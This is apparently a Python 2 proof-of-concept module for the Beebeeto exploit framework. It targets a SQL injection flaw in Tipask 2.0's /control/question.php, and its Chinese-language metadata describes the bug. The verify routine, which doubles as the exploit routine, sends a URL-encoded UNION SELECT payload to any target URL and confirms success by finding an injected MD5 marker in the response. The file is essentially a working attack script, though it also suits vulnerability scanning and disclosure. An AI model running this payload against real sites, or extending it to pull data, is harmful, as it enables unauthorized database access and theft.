#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0066',
            'name': 'Tipask 2.0 /control/question.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-13',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Tipask',
            'vul_version': ['2.0'],
            'type': 'SQL Injection',
            'tag': ['Tipask漏洞', 'SQL注入漏洞', '/control/question.php'],
            'desc': '''
                    Tipask 2.0 文件/control/question.php中Onajaxsearch函数对get的第二个参数urldecode后直接传入SQL语句，
                    绕过了前面的过滤和检查，导致SQL注入的产生。
                    ''',
            'references': ['http://wooyun.org/bugs/wooyun-2013-025802',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = (r'/?question/ajaxsearch/%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43'
                    '%54%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%6d%64%35'
                    '%28%33%2e%31%34%31%35%38%32%36%34%33%29%2c%31%30%2c%31%31%2c%31%32'
                    '%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%23')
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url, '')
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '5b93a4e6621594fc5149f47753844a8d' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
